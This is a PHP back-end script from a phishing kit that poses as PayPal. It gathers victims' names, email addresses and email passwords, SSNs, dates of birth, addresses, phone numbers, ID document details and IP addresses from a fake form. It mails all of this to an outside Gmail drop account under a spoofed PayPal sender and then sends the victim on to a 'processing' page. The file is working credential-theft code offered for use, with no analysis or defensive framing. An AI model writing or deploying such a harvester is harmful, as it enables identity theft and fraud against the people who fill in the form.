<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Paypal Info-----------------------\n";
$message .= "Full Name             : ".$_POST['formtext1']."\n";
$message .= "Email Address            : ".$_POST['formtext13']."\n";
$message .= "Email Password            : ".$_POST['formtext14']."\n";
$message .= "DOB Day             : ".$_POST['formselect1']."\n";
$message .= "DOB Month             : ".$_POST['formselect2']."\n";
$message .= "DOB Year             : ".$_POST['formselect3']."\n";
$message .= "Address             : ".$_POST['formtext2']."\n";
$message .= "City             : ".$_POST['formtext3']."\n";
$message .= "State            : ".$_POST['formtext4']."\n";
$message .= "Zip Code             : ".$_POST['formtext6']."\n";
$message .= "Country             : ".$_POST['formselect3']."\n";
$message .= "SSN             : ".$_POST['formtext7']."\n";
$message .= "Phone Number            : ".$_POST['formtext8']."\n";
$message .= "Identification Type              : ".$_POST['formselect5']."\n";
$message .= "Identification Issuer State             : ".$_POST['formtext5']."\n";
$message .= "Identification Number             : ".$_POST['formtext9']."\n";
$message .= "Identification Exp Date Day              : ".$_POST['formtext10']."\n";
$message .= "Identification Exp Date Month              : ".$_POST['formtext11']."\n";
$message .= "Identification Exp Date Year              : ".$_POST['formtext12']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Unknown-------------\n";
$send = "fudtools@gmail.com";
$subject = "Result from Unknown";
$headers = "From: Paypal<customer-support@mrs>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location: processing.html");

	 
?>